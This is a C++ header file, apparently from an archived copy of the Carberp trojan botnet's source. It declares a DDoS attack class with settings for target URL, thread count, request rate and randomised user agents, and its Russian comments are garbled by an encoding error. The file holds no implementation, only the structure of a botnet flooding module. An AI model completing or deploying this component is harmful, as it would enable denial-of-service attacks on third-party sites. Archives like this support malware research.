/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#ifndef DDOSClassesH
#define DDOSClassesH

//----------------------------------------------------------------------

#include "windows.h"
#include "Strings.h"
#include "GetApi.h"
#include "BotHTTP.h"
#include <WinSock.h>





// ����� ����������� DDOS ����
class TDDOS : public TBotObject
{
private:
	THTTPRequest FRequest;
	LPHOSTENT    FHostAddres;
	LONG         FThreadsCount;
	bool         FTerminated;
	string       FSendData;
	DWORD        FUserAgentsCount;
	DWORD        FDomainsCount;

	PCHAR GetRandomString(const PCHAR* StrArray, DWORD &ArraySize);
	friend DWORD WINAPI DDOSThreadProc(TDDOS *DDOS);
	int  MakeString(PCHAR Buf, PCHAR FormatLine, ...);
public:
	string URL;               // ����� �����
	DWORD  MaxThreads;        // ���������� ������� �����
	DWORD  AttemptsPerSecond; // ������� � ������� � ����� ������

	TDDOS();
	~TDDOS();

	BOOL Execute(bool Wait);
	BOOL Busy();
	void Terminate();
};




//----------------------------------------------------------------------
#endif